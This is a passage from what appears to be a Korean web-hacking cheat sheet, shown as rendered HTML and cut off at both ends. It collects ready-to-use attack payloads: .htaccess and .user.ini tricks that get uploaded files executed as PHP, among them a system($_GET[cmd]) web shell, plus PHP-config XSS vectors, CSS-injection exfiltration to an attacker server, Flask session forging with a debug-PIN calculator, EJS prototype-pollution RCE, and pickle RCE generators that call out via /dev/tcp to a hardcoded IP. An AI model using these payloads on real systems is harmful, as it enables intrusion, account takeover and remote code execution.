plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RemoveHandler .php .phtml .php3</span><br><span class="line">RemoveType .php .phtml .php3</span><br><span class="line">&#x2F;&#x2F; 이거 하나만 해도 됨</span><br><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure></li><li><p>.user.ini</p><ul><li><p>auto_append_file</p><ul><li><p>fastcgi 를 사용중인 php nginx 서버에서 사용 가능한 방법으로<br>.user.ini 파일을 업로드하면 하위폴더에서 사용되는 php.ini 설정을 오버라이딩 할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file &#x3D; a.jpg</span><br><span class="line">auto_append_file &#x3D; b.jpg</span><br></pre></td></tr></table></figure></li><li><p>위 두 설정은 php 파일 실행 이전/이후에 자동 인클루드 되도록 합니다.<br>확장자와 무관하게 내부 삽입된 스크립트 실행됨.</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;system($_GET[cmd]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><ul><li>본래 <code>&lt;script language=&quot;php&quot;&gt;</code>는 옵션이 설정된 상태에서만 php 코드로 해석하나, auto_append_file 등으로 include 될 때에는 옵션과 무관하게 내부 코드 실행됨</li></ul></li><li><p>direct / remote file inclusion</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag allow_url_include 1</span><br><span class="line">php_value auto_append_file data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br><span class="line">#php_value auto_append_file data:&#x2F;&#x2F;text&#x2F;plain,%3C%3Fphp+phpinfo%28%29%3B</span><br><span class="line">#php_value auto_append_file &lt;https:&#x2F;&#x2F;sektioneins.de&#x2F;evil-code.txt&gt;</span><br></pre></td></tr></table></figure></li><li><p>XSS and PHP code execution with UTF-7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw-script+AD4-alert(1)+ADsAPA-&#x2F;script+AD4 #+ADw?php phpinfo()+ADs</span><br></pre></td></tr></table></figure></li><li><p>XSS via error message link</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#39;foo&#39;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_errors 1</span><br><span class="line">php_flag html_errors 1</span><br><span class="line">php_value docref_root &quot;&#39;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&quot;</span><br></pre></td></tr></table></figure></li><li><p>XSS via error message link extension</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#39;foo&#39;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_errors 1</span><br><span class="line">php_flag html_errors 1</span><br><span class="line">php_value docref_root &quot;x&quot;</span><br><span class="line">php_value docref_ext &quot;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&quot;</span><br></pre></td></tr></table></figure></li><li><p>XSS via phps color</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.+\\.phps$&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php-source</span><br><span class="line">Order Allow,Deny</span><br><span class="line">Allow from all</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">test();</span><br><span class="line">&#x2F;&#x2F; comment</span><br><span class="line">?&gt;</span><br><span class="line">text</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&#39;</span><br></pre></td></tr></table></figure></li><li><p>XSS via highlight_file() color</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#x2F;&#x2F; comment</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&#39;</span><br></pre></td></tr></table></figure></li><li><p>failed PHP injection via error_log and include_path</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&#39;foo&#39;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log &#x2F;var&#x2F;www&#x2F;ex4a&#x2F;foo.php</span><br><span class="line">php_value include_path &quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></pre></td></tr></table></figure></li><li><p>failed PHP injection via error_log and auto_prepend_file</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log &#x2F;var&#x2F;www&#x2F;ipc&#x2F;ex4b&#x2F;foo.php</span><br><span class="line">php_value auto_prepend_file &quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></pre></td></tr></table></figure></li><li><p>PHP code injection via error_log and UTF-7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log &#x2F;var&#x2F;www&#x2F;ipc&#x2F;ex4c&#x2F;foo.php</span><br><span class="line">#---- &quot;&lt;?php phpinfo(); __halt_compiler();&quot; in UTF-7:</span><br><span class="line">php_value include_path &quot;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"></span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Erlang"><a href="#Erlang" class="headerlink" title="Erlang"></a>Erlang</h2><ul><li><p>list all defined functions</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">math:module_info().</span><br><span class="line">module_info().</span><br></pre></td></tr></table></figure></li></ul><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><ul><li><p>relative path override</p><ul><li><a href="https://blog.rubiya.kr/index.php/2019/04/17/relative-path-overwrite/" target="_blank" rel="noopener">https://blog.rubiya.kr/index.php/2019/04/17/relative-path-overwrite/</a></li></ul></li><li><p>css injection</p><ul><li>get tag attribute</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/css; charset=UTF-8"</span>);</span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">33</span>; $ascii &lt; <span class="number">126</span>; $ascii++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"@font-face&#123; font-family:poc; src: url(http://&#123;my_server&#125;/?"</span>.chr($ascii).<span class="string">"); unicode-range:U+00"</span>.dechex($ascii).<span class="string">";&#125;"</span>.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#flag&#123; font-family:poc;&#125;</span></span><br></pre></td></tr></table></figure><ul><li>get content charset</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/css; charset=UTF-8"</span>);</span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">33</span>; $ascii &lt; <span class="number">126</span>; $ascii++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"@font-face&#123; font-family:poc; src: url(http://&#123;my_server&#125;/?"</span>.chr($ascii).<span class="string">"); unicode-range:U+00"</span>.dechex($ascii).<span class="string">";&#125;"</span>.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#flag&#123; font-family:poc;&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="logical-vul"><a href="#logical-vul" class="headerlink" title="logical vul"></a>logical vul</h2><ul><li>never expired state + random event</li><li>idor<ul><li>설명 불필요</li></ul></li></ul><h2 id="auth-bypass"><a href="#auth-bypass" class="headerlink" title="auth bypass"></a>auth bypass</h2><ul><li><p>jwt none type injection</p></li><li><p>flask session generator</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.secret_key = <span class="literal">None</span></span><br><span class="line">app = App()  </span><br><span class="line">app.secret_key = sys.argv[<span class="number">1</span>]</span><br><span class="line">si = SecureCookieSessionInterface()  </span><br><span class="line">serializer = si.get_signing_serializer(app)  </span><br><span class="line">session = serializer.dumps(&#123;<span class="string">'admin'</span>:<span class="literal">True</span>&#125;)</span><br><span class="line">print(session)</span><br></pre></td></tr></table></figure></li><li><p>flagk-unsign</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask-unsign</span><br><span class="line">flask-unsign –sign –cookie <span class="string">"&#123;'is_admin': True&#125;"</span> –secret ‘DeRz7YDZ5nCDqR3vt33QpuhkrSYLmuX8<span class="string">' –legacy</span></span><br></pre></td></tr></table></figure></li><li><p>flask pin calculator</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span>,</span><br><span class="line">    <span class="string">'flask.app'</span>,</span><br><span class="line">    <span class="string">'Flask'</span>,</span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485410463771'</span>,</span><br><span class="line">    <span class="string">'cf0ba4b49af0063252dc6943557b002fe787baab6d9421be9c14813731e6626b'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure></li></ul><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><ul><li><p>prototype pollution</p><ul><li>EJS rce (<a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113</a>)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.outputFunctionName = <span class="string">"x;process.mainModule.require('child_process').exec('touch 1');x"</span>;</span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="built_in">require</span>(<span class="string">'ejs'</span>).renderFile);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(<span class="string">'index.ejs'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">7878</span>)</span><br></pre></td></tr></table></figure></li><li><a href="https://blog.rwx.kr/prototype-pollution-to-rce/" target="_blank" rel="noopener">https://blog.rwx.kr/prototype-pollution-to-rce/</a></li></ul></li><li><p>sandbox escape</p></li><li><p>unicode failure</p></li><li><p>regex dos</p></li><li><p>read file from UNC (windows)</p><ul><li>fs<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.readFile(<span class="string">"\\1.2.3.4\shared\1.js"</span>)</span><br></pre></td></tr></table></figure></li><li>express render<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">// set render engine</span></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span> (req, res) =&gt; &#123;</span><br><span class="line">  res.render(req.query.file);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Object.freeze(location)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.replace(1)</span><br></pre></td></tr></table></figure></li><li><p>JSON.stringify spacer</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;,<span class="string">''</span>, <span class="string">'"cmd":1,'</span>))</span><br></pre></td></tr></table></figure></li><li><p>variable _</p></li><li><p>repr 모드에서 마지막 라인 반환값과 동일</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"applemint"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(_); <span class="comment">// applemint</span></span><br></pre></td></tr></table></figure></li><li><p>String.fromCharCode mod</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">65601</span>) === <span class="string">'A'</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>scope touch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scope1 = <span class="built_in">Function</span>(<span class="string">'let abc = 123; scope2();'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scope2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>.callee.caller.arguments);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scope1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure></li><li><p>property searcher</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params">obj, history = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (history.length == <span class="number">0</span> &amp;&amp; obj[<span class="built_in">Symbol</span>.toStringTag]) history.push(obj[<span class="built_in">Symbol</span>.toStringTag]); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> keys = [];</span><br><span class="line">    <span class="keyword">if</span> (obj) keys = <span class="built_in">Object</span>.getOwnPropertyNames(obj);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> keys) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> val = obj[key];</span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; val[<span class="built_in">Symbol</span>.iterator] &amp;&amp; (val[<span class="built_in">Symbol</span>.iterator]+[]).indexOf(<span class="string">'[native code]'</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`[<span class="subst">$&#123;history.join(<span class="string">'.'</span>)&#125;</span>.<span class="subst">$&#123;key&#125;</span>][Symbol.iterator]`</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(val[<span class="built_in">Symbol</span>.iterator] + []);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> val === <span class="string">'object'</span> &amp;&amp; val !== obj &amp;&amp; key !== history[history.length - <span class="number">2</span>]) &#123;</span><br><span class="line">            search(val, history.concat(key));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">search(global);</span><br></pre></td></tr></table></figure><ul><li>overflow</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111111111111111</span> === <span class="number">11111111111111112</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li>infinite loop with overwrite object attribute on array expected</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://localhost/?param[length]=1e9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> data = req.query.param;</span><br><span class="line">   <span class="keyword">var</span> output = <span class="string">'output : '</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; ++i) &#123;</span><br><span class="line">      output += data[i];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   res.send(output);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>);</span><br></pre></td></tr></table></figure></li></ul><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><ul><li><p>python pickle</p><ul><li><p>pickle (os.system)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">DEFAULT_COMMAND = <span class="string">"bash -c 'echo 1 &gt; /dev/tcp/45.32.48.238/8888'"</span></span><br><span class="line">COMMAND = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> DEFAULT_COMMAND</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span><span class="params">(object)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">      <span class="keyword">return</span> (os.system,(COMMAND,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure></li><li><p>pickle (eval)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span><span class="params">(object)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (__builtins__.eval,(<span class="string">"__builtins__.__import__('os').popen('id').read()"</span>,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure></li><li><p>cPickle (os.system)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">DEFAULT_COMMAND = <span class="string">"bash -c 'echo 1 &gt; /dev/tcp/45.32.48.238/8888'"</span></span><br><span class="line">COMMAND = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> DEFAULT_COMMAND</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span><span class="params">(object)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (os.system,(COMMAND,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(cPickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure></li><li><p>cPickel (eval)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span><span class="params">(object)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (__builtins__.eval,(<span class="string">"__builtins__.__import__('os').popen('id').read()"</span>,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(cPickle.dumps(PickleRce())))</span><br></pre></td></tr></table></figure></li><li><p>pickle (for test)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, pickle, base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">'[!] no 